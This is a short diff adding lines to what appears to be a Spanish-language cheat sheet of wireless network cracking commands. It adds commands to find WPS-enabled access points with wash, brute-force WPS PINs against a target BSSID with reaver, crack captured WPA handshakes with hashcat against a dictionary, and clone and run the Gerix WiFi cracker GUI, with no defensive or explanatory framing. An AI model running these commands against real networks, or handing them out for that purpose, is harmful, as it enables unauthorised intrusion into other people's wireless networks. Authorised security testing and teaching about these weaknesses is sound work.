@@ -78,3 +78,15 @@ aircrack-ng –w [diccionario] [archivo .cap]
 Nuevo
 #################################################
 
+WPS
+wash -i wlan0mon -C
+reaver -i wlan0mon -b BSSID-ANTERIOR -vv
+
+
+Cracking WPA
+hashcat -m 2500 CAPTURE-FILE DICC
+
+Gerix Wifi Cracker (GUI)
+git clone https://github.com/J4r3tt/gerix-wifi-cracker-2.git
+python gerix.py
+
